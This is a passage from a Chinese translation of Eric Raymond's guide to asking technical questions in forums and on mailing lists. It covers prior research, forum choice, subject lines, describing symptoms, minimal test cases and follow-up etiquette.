网络礼仪 指南，我一般会拒绝那些与引出技术论坛中有用的回答不特别相关的建议。）</p><h3 id="提问前"><a href="#提问前" class="headerlink" title="提问前"></a>提问前</h3><p>在通过电邮、新闻组或论坛提技术问题以前，做以下事情：</p><ul><li>尝试在你准备提问论坛的历史文档中搜索答案</li><li>尝试搜索互联网以找到答案</li><li>尝试阅读手册以找到答案</li><li>尝试阅读“常见问题文档”（FAQ）以找到答案</li><li>尝试自己检查或试验以找到答案</li><li>尝试请教懂行的朋友以找到答案</li><li>如果你是程序员，尝试阅读源代码以找到答案</li></ul><p>提问时，请先表明你已做了上述事情，这将有助于建立你不是寄生虫与浪费别人时间的印象。最好再表述你从中 学到的东西 ，我们喜欢回答那些表现出能从答案中学习的人。</p><p>运用某些策略，比如用谷歌（Google）搜索你遇到的各种错误提示（既搜索 谷歌论坛，也搜索网页）， 这样很可能直接就找到了解决问题的文档或邮件列表线索。 即使没有结果，在邮件列表或新闻组寻求帮助时提一句“我在谷歌中搜过下列句子但没有找到什么有用的东西” 也是件好事，至少它表明了搜索引擎不能提供哪些帮助。将搜索关键词与你的问题及可能的解决方案联系起来，还有助于引导其他有类似问题的人。</p><p>别着急，不要指望几秒钟的谷歌搜索就能解决一个复杂的问题。读一下常见问题文档。在向专家提问之前，先向后靠靠放松一下，再思考一下问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑抛出，只因你的第一次搜索没有结果（或者结果太多）。</p><p>认真地思考，准备好你的问题。轻率的提问只能得到轻率的回答，或者压根没有。在提问时，你越是表现出在此前做过思考与努力去解决自己的问题，你越有可能得到真正的帮助。</p><p>注意别提错问题。如果提问基于错误的假设，某黑客多半会一边想 “愚蠢的问题……”，一边按将错就错的答案回复你，并且希望这种只是得到你自己“问的问题”而非真正所需的解答，给你一个教训。</p><p>永远不要假设你 有资格 得到解答。你没有这种资格，毕竟你没有为此服务付费。如果你能够提出有内容、有趣和激励思考的问题──那种毫无疑问能够向社区贡献经验，而不仅仅是消极地要求从别人那获取知识的问题，你将“挣到”答案。</p><p>另一方面，表明你有能力也乐意参与问题的解决是个很好的开端。“有没有人能指个方向？”，我这还差点什么？”，“我应该查哪个网站？”，通常要比 “请给出我可以用的完整步骤”更容易得到回复，因为你表明了只要有人能指个方向，你就很乐意完成剩下的过程。</p><h3 id="提问时"><a href="#提问时" class="headerlink" title="提问时"></a>提问时</h3><h4 id="仔细挑选论坛"><a href="#仔细挑选论坛" class="headerlink" title="仔细挑选论坛"></a>仔细挑选论坛</h4><p>要对在哪提问留心，如果你做了下述事情，多半会被一笔勾销或被看成“失败者”：</p><ul><li>张贴与论坛主题无关的问题</li><li>在面向高级技术问题的论坛上张贴肤浅的问题，或者反之。</li><li>在太多不同的新闻组同时张贴</li><li>给既非熟人也没有义务解决你问题的人发送你私人的电邮</li></ul><p>为保护通信的渠道不被无关的东西淹没，黑客会除掉那些没有找对地方的问题，你不会想让这种事落到自己头上的。</p><p>因此，第一步是找对论坛。谷歌和其它搜索引擎还是你的朋友，可以用它们搜索你遇到困难的软硬件问题最相关的项目网站。那里通常都有项目的常见问题（FAQ）、邮件列表及文档的链接。如果你的努力（包括 阅读 FAQ）都没有结果，这些邮件列表就是最后能取得帮助的地方。项目的网站也许还有报告Bug的流程或链接，如果是这样，去看看。</p><p>向陌生的人或论坛发送邮件极有可能是在冒险。譬如，不要假设一个内容丰富的网页的作者想充当你的免费顾问，不要对你的问题是否会受到欢迎做太乐观的估计──如果你不确定，向别处发或者压根别发。</p><p>在选择论坛、新闻组或邮件列表时，别太相信名字，先看看 FAQ 或者许可书以明确你的问题是否切题。发贴前先翻翻已有的帖子，这样可以让你感受一下那里行事的方式。事实上，张贴前在新闻组或邮件列表的历史文档中搜索与你问题相关的关键词是个极好的主意，也许就找到答案了。即使没有，也能帮助你归纳出更好的问题。</p><p>别象机关枪似的一次性“扫射”所有的帮助渠道，这就象大喊大叫一样会令人不快，温柔地一个一个来。</p><p>弄懂主题！最典型的错误之一是在某种致立于跨平台可移植的语言、库或工具的论坛中提关于 Unix 或 Windows 操作系统程序接口的问题。如果你不明白为什么这是大错，最好在搞清楚概念前什么也别问。</p><p>一般来说，在仔细挑选的公共论坛中提问比在私有论坛中提同样的问题更容易得到有用的回答。有几个道理支持这点，一是看潜在的回复者有多少，二是看论坛的参与者有多少，黑客更愿回答能启发多数人的问题。</p><p>可以理解，老练的黑客和一些流行软件的作者正在承受过多的不当消息。就象那根最后压垮骆驼背的稻草一样，你的加入也有可能使情况走向极端──已经好几次了，一些流行软件的作者退出了对自己软件的支持，因为伴随而来的涌入其私人邮箱的垃圾邮件变得无法忍受。</p><h4 id="面向新手的论坛和互联网中继聊天（IRC）通常响应最快"><a href="#面向新手的论坛和互联网中继聊天（IRC）通常响应最快" class="headerlink" title="面向新手的论坛和互联网中继聊天（IRC）通常响应最快"></a>面向新手的论坛和互联网中继聊天（IRC）通常响应最快</h4><p>本地的用户组织或者你所用的 Linux 发行版也许正在宣传新手取得帮助的论坛或 IRC 通道（在一些非英语国家，新手论坛很可能还是邮件列表），这些地方是开始提问的好去处，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。经过宣传的 IRC 通道是公开邀请提问的地方，通常可以得到实时的回复。</p><p>事实上，如果出问题的程序来自某发行版（这很常见），最好先去该发行版的论坛或邮件列表中提问，再到程序本身的项目论坛或邮件列表，（否则）该项目的黑客可能仅仅回复“用 我们的 代码”。</p><p>在任何论坛发贴以前，先看看有没有搜索功能。如果有，就试着用问题的几个关键词搜索一下，也许就有帮助。如果在此之前你已做过全面的网页搜索（你应该这样去做），还是再搜索一下论坛，搜索引擎有可能没来得及索引此论坛的全部内容。</p><p>通过论坛或 IRC 通道提供项目的用户支持有增长的趋势，电子邮件交流则更多地为项目开发者保留。所以先在论坛或 IRC 中寻求与该项目相关的帮助。</p><h4 id="第二步，使用项目的邮件列表"><a href="#第二步，使用项目的邮件列表" class="headerlink" title="第二步，使用项目的邮件列表"></a>第二步，使用项目的邮件列表</h4><p>当某个项目存在开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答你的问题。查一查项目的文档和主页，找到项目的邮件列表并使用它。采用这种办法有几个很好的理由：</p><ul><li>向个别开发者提的问题（如果）足够好，也将对整个项目组有益。相反，如果你认为自己的问题对整个项目组来说太愚蠢，这也不能成为骚扰个别开发者的理由。</li><li>向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导）也许太忙以至于没法回答你的问题。</li><li>大多数邮件列表都要存档，那些存档将被搜索引擎索引，如果你向列表提问并得到解答，将来其它人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。</li><li>如果某些问题经常被问到，开发者可以利用此信息改进文档或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。</li></ul><p>如果一个项目既有 “用户” 也有“开发者”（或 “黑客”）邮件列表或论坛，而你又不摆弄那些代码，向“用户”列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会遭受你的噪音干扰。</p><p>然尔，如果你 确信 你的问题不一般，而且在“用户” 列表或论坛中几天都没有回复，可以试试“开发者”列表或论坛。建议你在张贴前最好先暗暗地观察几天,至少看看最近几天保存的帖子,以了解那的行事方式（事实上这是参与任何私有或半私有列表的好主意）</p><p>如果你找不到一个项目的邮件列表，而只能查到项目维护者的地址，只管向其发信。即便在这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中陈述你已经试过但没有找到合适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。</p><h4 id="使用有意义且明确的主题"><a href="#使用有意义且明确的主题" class="headerlink" title="使用有意义且明确的主题"></a>使用有意义且明确的主题</h4><p>在邮件列表、新闻组或论坛中，主题是你在五十个或更少的字以内吸引有资格专家注意的黄金机会，不要用诸如 “请帮我” （更别提大写的 “请帮我！！！！”，这种主题的消息会被条件反射式地删掉）之类的唠叨浪费机会。不要用你痛苦的深度来打动我们，相反，要在这点空间中使用超级简明扼要的问题描述。</p><p>使用主题的好惯例是“对象──偏差”（式的描述），许多技术支持组织就是这样做的。在“对象”部分指明是哪一个或哪一组东西有问题，在“偏差”部分则描述与期望的行为不一致的地方。</p><p>愚蠢：</p><blockquote><p>救命啊！我的笔记本视频工作不正常！</p></blockquote><p>明智：</p><blockquote><p>X.org 6.8.1 扭曲鼠标光标，MV1005 型号的某显卡芯片组</p></blockquote><p>更明智：</p><blockquote><p>使用 MV1005 型号的某显卡芯片组在 X.org 6.8.1 的鼠标光标被扭曲</p></blockquote><p>编写 “对象──偏差”式描述的过程有助于你组织对问题的细致思考。是什么被影响了？仅仅是鼠标光标或者还有其它图形？只在 X.org 中出现？或只是在其 6.8.1 版中？是针对某显卡芯片组？或者只是其中的 MV1005 型号？一个黑客只需描一眼就能够立即明白什么是你遇到的问题，什么是你自己的问题。</p><p>更一般地，想象一下在一个只显示主题的文档索引中查找。让你的主题更好地反映问题，可以使下一个搜索类似问题的人能够在文档中直接就找到答案的线索，而不用再次发贴提问。</p><p>如果你想在回复中提问，确保改变主题以表明你是在问一个问题，一个主题象 <code>Re: 测试</code> 或者 <code>Re: 新Bug</code> 的消息不太可能引起足够的注意。同时，将回复中与新主题不甚相关的引用内容尽量删除。</p><p>对于列表消息，不要直接点击回复（按钮）来开始一个全新的线索，这将限制你的观众。有些邮件阅读程序，比如 mutt，允许用户按线索排序并通过折叠线索来隐藏消息，这样做的人永远看不到你发的消息。</p><p>仅仅改变主题还不够。mutt 和其它一些邮件阅读程序还要检查邮件头主题以外的其它信息，以便为其指定线索，所以宁可发一个全新的邮件。</p><p>在论坛，因为消息与特定的线索紧密结合，并且通常在线索之外不可见，好的提问方式略有不同，通过回复提问并不要紧。不是所有论坛都允许在回复中出现分离的主题，而且这样做了基本上没有人会去看。不过，通过回复提问本身就是令人怀疑的做法，因为它们只会被正在查看该线索的人读到。所以，除非你 只想 在该线索当前活跃的人群中提问，还是另起炉灶比较好。</p><h4 id="使问题容易回复"><a href="#使问题容易回复" class="headerlink" title="使问题容易回复"></a>使问题容易回复</h4><p>以<code>请向……回复</code>来结束问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟考虑你的问题更麻烦。如果你的邮件客户端程序不支持这样做，换个好点的；如果是操作系统不支持所有这种邮件客户端程序，也换个好点的。</p><p>在论坛，要求通过电子邮件回复是完全无礼的，除非你确信回复的信息也许是敏感的（而且有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复线索时得到电子邮件提醒，可以要求论坛发送。几乎所有论坛都支持诸如<code>留意本线索</code>、<code>有回复发送邮件</code>等功能。</p><h4 id="用清晰、语法、拼写正确的语句书写"><a href="#用清晰、语法、拼写正确的语句书写" class="headerlink" title="用清晰、语法、拼写正确的语句书写"></a>用清晰、语法、拼写正确的语句书写</h4><p>经验告诉我们，粗心与草率的作者通常也粗心与草率地思考和编程（我敢打赌）。为这些粗心与草率的思考者回答问题没有什么好处，我们宁可将时间花在其它地方。</p><p>清楚、良好地表达你的问题非常重要。如果你觉得这样做麻烦，我们也觉得注意（你的问题）麻烦。花点额外的精力斟酌一下字句，用不着太僵硬与正式──事实上，黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它 必须 很准确，而且有迹象表明你是在思考和关注问题。</p><p>正确地拼写、使用标点和大小写，不要将 <code>its</code> 混淆为 <code>it&#39;s</code>，<code>loose</code> 搞成 <code>lose</code> 或者将 “discrete” 弄成 “discreet”。不要全部用大写，这会被视为无礼的大声嚷嚷 （全部小写也好不到哪去，因为不易阅读。Alan Cox [注：著名黑客，Linux 内核的重要参与者] 也许可以这样做，但你不行。）</p><p>一般而言，如果你写得象个半文盲似的傻子，多半得不到理睬。也不要使用即时通讯中的简写，如将 <code>you</code> 简化为 <code>u</code> 会使你看起来象一个为了节约二次击键的半文盲式的傻子。更糟的是，如果象个小孩似地鬼画桃符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。</p><p>如果在非母语论坛提问，你的拼写与语法错误会得到有限的宽容，但懒惰完全不会被容忍（是的，我们通常看得出其中的差别）。同时，除非你知道回复者使用的语言，请使用英语书写。繁忙的黑客一般会直接删除用他们看不懂语言写的消息。在互联网上英语是工作语言，用英语书写可以将你的问题不被阅读就被直接删除的可能性降到最低。</p><p>如果你用英语书写但它是你的第二语言，最好提醒潜在的回复者语言上可能的困难以便绕过这个问题，比如：</p><ul><li>英语不是我的母语，请谅解拼写错误。</li><li>如果您使用某某语言，请电邮&#x2F;私聊我，也许我需要您的协助翻译我的问题。</li><li>对于这个技术术语本身我很熟悉，但对于它的一些俚语或习惯表达方式就不太明白了。</li><li>我已经同时用某某语及英语提问，如果您使用两者之一回复，我很乐意翻译。</li></ul><h4 id="使用易于读取且标准的文件格式发送问题"><a href="#使用易于读取且标准的文件格式发送问题" class="headerlink" title="使用易于读取且标准的文件格式发送问题"></a>使用易于读取且标准的文件格式发送问题</h4><p>如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：</p><ul><li>使用纯文本而不是 HTML（超文本标注语言）（ 关闭HTML 并不难）</li><li>使用 MIME（多用途互联网邮件扩展）附件通常没有问题，前提是真正有内容（譬如附带的源文件或补丁），而不仅仅是邮件客户端程序生成的模板（譬如只是消息内容的拷贝）。</li><li>不要发送整段只是单行句子但多次折回的邮件（这使得回复部分内容非常困难）。设想你的读者是在80个字符宽的文本终端阅读邮件，设置你的行折回点小于 80 列。</li><li>但是，也 不要 用任何固定列折回数据（譬如日志文件拷贝或会话记录）。数据应该原样包含，使回复者确信他们看到的是与你看到的一样的东西。</li><li>在英语论坛中，不要使用’Quoted-Printable’ MIME 编码发送消息。这种编码对于张贴非 ASCII 语言可能是必须的，但很多邮件程序并不支持。当它们分断时，那些文本中四处散布的 “&#x3D;20”符号既难看也分散注意力，甚至有可能破坏内容的语意。</li><li>永远不要 指望黑客们阅读使用封闭的专用格式编写的文档，诸如微软公司的 Word 或 Excel 文件等。大多数黑客对此的反应就象有人将还在冒热气的猪粪倒在你门口时你的反应一样。即使他们能够处理，也很厌恶这么做。</li><li>如果你从使用视窗的电脑发送电子邮件，关闭问题颇多的微软“聪明引用”功能（在“工具” -&gt; “自动纠正选项”的“输入时自动格式化”下去掉聪明引用的选框），以免在你的邮件中到处散布垃圾字符。</li><li>在论坛，勿滥用“表情符号”和“HTML”功能(当它们提供时)。一两个表情符号通常没有问题，但花哨的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来象个傻笑的小姑娘。这通常不是个好主意，除非你只是对性而不是有用的回复更有兴趣。</li><li>如果你使用图形用户界面的邮件客户端程序(如网景公司的 Messenger、微软公司的 Outlook 或者其它类似的)，注意它们的缺省配置不一定满足这些要求。大多数这类程序有基于菜单的<code>查看源码</code>命令，用它来检查发送文件夹中的消息，以确保发送的是没有多余杂质的纯文本文件。</li></ul><h4 id="描述问题应准确且有内容"><a href="#描述问题应准确且有内容" class="headerlink" title="描述问题应准确且有内容"></a>描述问题应准确且有内容</h4><ul><li>仔细、清楚地描述问题的症状</li><li>描述问题发生的环境(主机、操作系统、应用程序，任何相关的)，提供销售商的发行版和版本号（如：“Fedora Core 7”、“Slackware 9.1”等）</li><li>描述提问前做过的研究及其理解。</li><li>描述提问前为确定问题而采取的诊断步骤。</li><li>描述最近对计算机或软件配置的任何相关改变。</li><li>如果可能，提供在可控环境下重现问题的方法。</li><li>尽最大努力预测黑客会提到的问题，并提前备好答案。</li></ul><p>如果你认为是代码有问题，向黑客提供在可控环境下重现问题的方法尤其重要。当你这么做时，得到有用且及时回复的可能性将大大增加。</p><p><a href="http://www.chiark.greenend.org.uk/%7Esgtatham/">西蒙.泰瑟姆（Simon Tatham）</a>写过一篇《<a href="http://www.chiark.greenend.org.uk/%7Esgtatham/bugs-tw.html">如何有效报告Bug》</a>的文章，我强烈推荐各位阅读。</p><h4 id="量不在多，精炼则灵"><a href="#量不在多，精炼则灵" class="headerlink" title="量不在多，精炼则灵"></a>量不在多，精炼则灵</h4><p>你应该（写得）精炼且有内容，简单地将一大堆代码或数据罗列在求助消息中达不到目的。如果你有一个很大且复杂的测试样例让程序崩溃，尝试将其裁剪得越小越好。</p><p>至少有三个理由支持这点。第一，让别人看到你在努力简化问题使你更有可能得到回复。第二，简化问题使你更有可能得到 <code>有用的</code> 回复。第三，在提纯Bug报告的过程中，你可能自己就找到了解决办法或权宜之计。</p><h4 id="别急于宣称找到Bug"><a href="#别急于宣称找到Bug" class="headerlink" title="别急于宣称找到Bug"></a>别急于宣称找到Bug</h4><p>当你在一个软件中遇到问题，除非你 非常、非常 的有根据，不要动辄声称找到了Bug。提示：除非你能提供解决问题的源代码补丁，或者对前一版本的回归测试表现出不正确的行为，否则你都多半不够完全确信。对于网页和文档也如此，如果你（声称）发现了文档的“Bug”，你应该能提供相应位置的替代文本。</p><p>记住，还有许多其它用户并未经历你遇到的问题，否则你在阅读文档或搜索网页时就应该发现了（<a href="#%E4%BD%A0%E5%9C%A8%E6%8A%A5%E6%80%A8%E5%89%8D%E5%B7%B2%E7%BB%8F%E5%81%9A%E4%BA%86%E8%BF%99%E4%BA%9B%EF%BC%8C%E6%98%AF%E5%90%A7" title="？">你在报怨前已经做了这些，是吧 ？</a>）。这也意味着很有可能是你弄错了而不是软件本身有问题。</p><p>编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了Bug，也就置疑了他们的能力，即使你是对的，也有可能会使其中的部分人感到不快。（此外，）在主题中嚷嚷“Bug”也是特别不老练的。</p><p>提问时，即使你私下非常确信已经发现一个真正的Bug，最好写得象是 你 做错了什么。如果真的有Bug，你会在回复中看到这点。这样做的话，如果真有虫子，维护者就会向你道歉，这总比你弄砸了然后欠别人一个道歉要强。</p><h4 id="低声下气代替不了做自己的家庭作业"><a href="#低声下气代替不了做自己的家庭作业" class="headerlink" title="低声下气代替不了做自己的家庭作业"></a>低声下气代替不了做自己的家庭作业</h4><p>有些人明白他们不应该粗鲁或傲慢地行事并要求得到答复，但他们退到相反的低声下气的极端：“我知道我只是个可怜的新丁，一个失败者，但……”。这既使人困扰，也没有用，当伴随着对实际问题含糊的描述时还特别令人反感。</p><p>别用低级灵长类动物的办法浪费你我的时间，相反，尽可能清楚地描述背景情况和你的问题，这比低声下气更好地摆正了你的位置。</p><p>有时，论坛设有单独的初学者提问版面，如果你真的认为遇到了肤浅的问题，到那去就是了，但一样别低声下气。</p><h4 id="描述问题症状而不是猜测"><a href="#描述问题症状而不是猜测" class="headerlink" title="描述问题症状而不是猜测"></a>描述问题症状而不是猜测</h4><p>告诉黑客是什么导致了问题是没用的（如果你的诊断理论是了不起的东西，你还会向别人咨询求助吗？）。所以，确保只是告诉他们问题的原始症状，而不是你的解释和理论，让他们来解释和诊断。如果你认为陈述自己的猜测很重要，应清楚地说明这只是你的猜测并描述为什么它们不起作用。</p><p>愚蠢：</p><blockquote><p>我在编译内核时接连遇到 SIG11 错误，怀疑主板上的某根电路丝断了，找到它们的最好办法是什么？</p></blockquote><p>明智：</p><blockquote><p>我组装的电脑（K6&#x2F;233 CPU、FIC-PA2007 主板[威盛 Apollo VP2 芯片组]、Corsair PC133 SDRAM 256Mb 内存）最近在开机 20 分钟左右、做内核编译时频繁地报 SIG11 错，但在头 20 分钟内从不出问题。重启动不会复位时钟，但整夜关机会。更换所有内存未解决问题，相关的典型编译会话日志附后。</p></blockquote><p>由于以上这点许多人似乎难以掌握，这里有句话可以提醒你：“所有的诊断专家都来自密苏里州”。美国国务院的官方座右铭则是“让我看看”（出自国会议员威勒德.D.范迪弗［Willard D. Vandiver］在1899年时的讲话：“我来自一个出产玉米、棉花、牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。”）针对诊断者而言，这并不是怀疑，而只是一种真实而有用的需求，以便让他们看到与你看到的原始证据尽可能一致的东西，而不是你的猜测与总结。（所以，）让我们看看。</p><h4 id="按时间先后罗列问题症状"><a href="#按时间先后罗列问题症状" class="headerlink" title="按时间先后罗列问题症状"></a>按时间先后罗列问题症状</h4><p>刚出问题之前发生的事情通常包含有解决问题最有效的线索。所以，记录中应准确地描述你、电脑和软件在崩溃前都做了什么。在命令行处理的情况下，有会话日志（如运行脚本工具生成的）并引用相关的若干（如20）行记录会非常有帮助。</p><p>如果崩溃的程序有诊断选项（如-v详述开关），试着选择这些能在记录中增加排错信息的选项。记住，“多”不等于“好”。试着选取适当的排错级别以便提供有用的信息而不是将阅读者淹没在垃圾中。</p><p>如果你的记录很长（如超过四段），在开头简述问题随后按时间先后罗列详细过程也许更有用。这样，黑客在读你的记录时就知道该注意哪些内容了。</p><h4 id="描述目标而不是过程"><a href="#描述目标而不是过程" class="headerlink" title="描述目标而不是过程"></a>描述目标而不是过程</h4><p>如果你想弄清楚如何做某事（而不是报告一个Bug），在开头就描述你的目标，然后才陈述遇到问题的特定步骤。</p><p>经常出现这种情况，寻求技术帮助的人在脑袋里有个更高层次的目标，他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身有问题，结果要费很大的劲才能通过。</p><p>愚蠢：</p><blockquote><p>我怎样才能让某图形程序的颜色拾取器取得十六进制的 RGB 值？</p></blockquote><p>明智：</p><blockquote><p>我正试着用自己选定数值的颜色替换一幅图片的色表，我现在知道的唯一方法是编辑每个表槽，但却无法让某图形程序的颜色拾取器取得十六进制的 RGB 值。</p></blockquote><p>第二种提法是明智的，它使得建议采用更合适的工具以完成任务的回复成为可能。</p><h4 id="别要求私下回复电邮"><a href="#别要求私下回复电邮" class="headerlink" title="别要求私下回复电邮"></a>别要求私下回复电邮</h4><p>黑客们认为问题的解决过程应该公开、透明，此过程中如果更有才能的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为回复者也因为能力和学识被其它同行看到而得到某种回报。</p><p>当你要求私下回复时，此过程和回报都被中止。别这样做，让 回复者 来决定是否私下回答──如果他真这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于对其它人毫无意义。</p><p>对这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么“向我发电邮，我将为论坛归纳这些回复”将是神奇的句子。试着将邮件列表或新闻组从洪水般雷同的回复中解救出来是非常有礼貌的──但你必须信守诺言。</p><h4 id="提问应明确"><a href="#提问应明确" class="headerlink" title="提问应明确"></a>提问应明确</h4><p>漫无边际的问题通常也被视为没有明确限制的时间无底洞。最有可能给你有用答案的人通常也是最忙的人（假如只是因为他们承担了太多工作的话），这些人对于没有止境的时间无底洞极其敏感，所以他们也倾向于讨厌那些漫无边际的问题。</p><p>如果你明确了想让回复者做的事（如指点方向、发送代码、检查补丁或其它），你更有可能得到有用的回复。（因为）这样可以让他们集中精力并间接地设定了他们为帮助你需要花费的时间和精力上限，这很好。</p><p>要想理解专家生活的世界，可以这样设想：那里有丰富的专长资源但稀缺的响应时间。你暗中要求他们奉献的时间越少，你越有可能从这些真正懂行也真正很忙的专家那里得到解答。</p><p>所以限定你的问题以使专家回答时需要付出的时间最少──这通常与简化问题还不太一样。举个例，“请问可否指点一下哪有好一点的 X 解释？”通常要比“请解释一下 X”明智。如果你的代码不运行了，通常请别人看看哪有问题比叫他们帮你改正更明智。</p><h4 id="关于代码的问题"><a href="#关于代码的问题" class="headerlink" title="关于代码的问题"></a>关于代码的问题</h4><p>别要求他人给你出问题的代码排错而不提及应该从何入手。张贴几百行的代码，然后说一声“它不能运行”会让你得不到理睬。只贴几十行代码，然后说一句“在第七行以后，本应该显示，但实际出现的是”非常有可能让你得到回复。</p><p>最精确描述代码问题的方法是提供一个能展示问题的最小测试样例。什么是最小测试样例？它是对问题的展现，只需要刚好能够重现非预期行为的代码即可。如何生成一个最小测试样例？如果你知道哪一行或哪一段代码会产生问题，将其复制并提供刚好够用的外围支撑代码以构成一个完整的样例（够用是指源码刚好能被编译器、解释器或任何处理它的程序所接受）。如果你不能将问题缩小到特定的段落，复制源码并去除那些与问题无关的代码段。你能提供的最小测试样例越小越好（参见 量不在多，精炼则灵 ）。</p><p>生成一个非常小的最小测试样例并不总是可能，但尽力去做是很好的锻练，这有可能帮助你找到需要自己解决的问题。即使你找不到，黑客们喜欢看到你努力过，这将使他们更合作。</p><p>如果你只是想让别人帮忙审一下代码，在最开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。</p><h4 id="别张贴家庭作业式问题"><a href="#别张贴家庭作业式问题" class="headerlink" title="别张贴家庭作业式问题"></a>别张贴家庭作业式问题</h4><p>黑客们善于发现“家庭作业”式的问题。我们中的大多数人已经做了自己的家庭作业，那是该 你 做的，以便从中学到东西。问一下提示没有关系，但不是要求完整的解决方案。</p><p>如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在用户组、论坛或（作为最后一招）在项目的“用户”邮件列表或论坛中提问。尽管黑客们 会 看出来，一些老用户也许仍会给你提示。</p><h4 id="删除无意义的要求"><a href="#删除无意义的要求" class="headerlink" title="删除无意义的要求"></a>删除无意义的要求</h4><p>抵制这种诱惑，即在求助消息末尾加上诸如“有人能帮我吗？”或“有没有答案？”之类在语义上毫无意义的东西。第一，如果问题描述还不完整，这些附加的东西最多也只能是多余的。第二，因为它们是多余的，黑客们会认为这些东西烦人──就很有可能用逻辑上无误但打发人的回复，诸如“是的，你可以得到帮助”和“不，没有给你的帮助”。</p><p>一般来说，避免提“是或否”类型的问题，除非你想得到 “是或否”类型的回答。</p><h4 id="不要把问题标记为“紧急”，即使对你而言的确如此"><a href="#不要把问题标记为“紧急”，即使对你而言的确如此" class="headerlink" title="不要把问题标记为“紧急”，即使对你而言的确如此"></a>不要把问题标记为“紧急”，即使对你而言的确如此</h4><p>这是你的问题，不要我们的。宣称“紧急”极有可能事与愿违：大多数黑客会直接删除这种消息，他们认为这是无礼和自私地企图得到即时与特殊的关照。而且“紧急”或其它有类似含义的主题有可能触发垃圾过滤规则，潜在的回复者可能永远看不到你的问题！</p><p>有一点点局部的例外，如果你是在一些知名度很高、会使黑客们激动的地方使用程序，也许值得这样去做。在这种情况下，如果你有期限压力，也很有礼貌地提到这点，人们也许会有足够的兴趣快一点回答。</p><p>当然，这是非常冒险的，因为黑客们对什么是令人激动的标准多半与你的不同。譬如从国际空间站这样张贴没有问题，但代表感觉良好的慈善或政治原因这样做几乎肯定不行。事实上，张贴诸如“紧急：帮我救救这个毛绒绒的小海豹！”肯定会被黑客回避或光火，即使他们认为毛绒绒的小海豹很重要。</p><p>如果你觉得这不可思议，再把剩下的内容多读几遍，直到弄懂了再发贴也不迟。</p><h4 id="礼貌总是有益的"><a href="#礼貌总是有益的" class="headerlink" title="礼貌总是有益的"></a>礼貌总是有益的</h4><p>礼貌一点，使用 <code>请</code> 和 <code>谢谢你的关注</code> 或者 <code>谢谢你的关照</code>，让别人明白你感谢他们无偿花时间帮助你。</p><p>坦率地讲，这一点没有语法正确、文字清晰、准确、有内容和避免使用专用格式重要（同时也不能替代它们）。黑客们一般宁可读有点唐突但技术鲜明的Bug报告，而不是那种有礼但含糊的报告。（如果这点让你不解，记住我们是按问题能教我们什么来评价它的）</p><p>然尔，如果你已经谈清楚了技术问题，客气一点肯定会增加你得到有用回复的机会。</p><p>（我们必须指出，本文唯一受到一些老黑客认真反对的地方是以前曾经推荐过的“提前谢了”，一些黑客认为这隐含着事后不用再感谢任何人的暗示。我们的建议是要么先说 <code>提前谢了</code>，事后 再 对回复者表示感谢，要么换种方式表达，譬如用 <code>谢谢你的关注</code> 或 <code>谢谢你的关照</code>）。</p><h4 id="问题解决后追加一条简要说明"><a href="#问题解决后追加一条简要说明" class="headerlink" title="问题解决后追加一条简要说明"></a>问题解决后追加一条简要说明</h4><p>问题解决后向所有帮助过的人追加一条消息，让他们知道问题是如何解决的并再次感谢。如果问题在邮件列表或新闻组中受到广泛关注，在那里追加此消息比较恰当。</p><p>最理想的方式是向最初提问的线索回复此消息，并在主题中包含 <code>已解决</code>、<code>已搞定</code> 或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见线索 <code>问题 X</code> 和 <code>问题 X-已解决</code> 的潜在回复者就明白不用再浪费时间了（除非他个人觉得“问题 X”有趣），因此可以利用此时间去解决其它问题。</p><p>追加的消息用不着太长或太复杂，一句简单的“你好──是网线坏了！谢谢大家──比尔”就比什么都没有要强。事实上，除非解决问题的技术真正高深，一条简短而亲切的总结比长篇大论要好。说明是什么行动解决了问题，用不着重演整个排错的故事。</p><p>对于有深度的问题，张贴排错历史的摘要是恰当的。描述问题的最终状态，说明是什么解决了问题，在此之后 才指明可以避免的弯路。应避免的弯路部分应放在正确的解决方案和其它总结材料之后，而不要将此消息搞成侦探推理小说。列出那些帮助过你的名字，那样你会交到朋友的。</p><p>除了有礼貌、有内容以外，这种类型的追帖将帮助其他人在邮件列表、新闻组或论坛文档中搜索到真正解决你问题的方案，从而也让他们受益。</p><p>最后，此类追帖还让每位参与协助的人因问题的解决而产生一种满足感。如果你自己不是技术专家或黑客，相信我们，这种感觉对于你寻求帮助的老手和专家是非常重要的。问题叙述到最后不知所终总是令人沮丧的，黑客们痒痒地渴望它们被解决。<code>挠痒痒</code> 为你挣到的信誉将对你下次再次张贴提问非常非常的有帮助。</p><p>考虑一下怎样才能避免他人将来也遇到类似的问题，问问自己编一份文档或 FAQ 补丁会不会有帮助，如果是的话就将补丁发给维护者。</p><p>在黑客中，这种良好的后继行动实际上比传统的礼貌更重要，也是你善待他人而赢得声誉的方式，这是非常有价值的财富。</p><h3 id="如何解读回答"><a 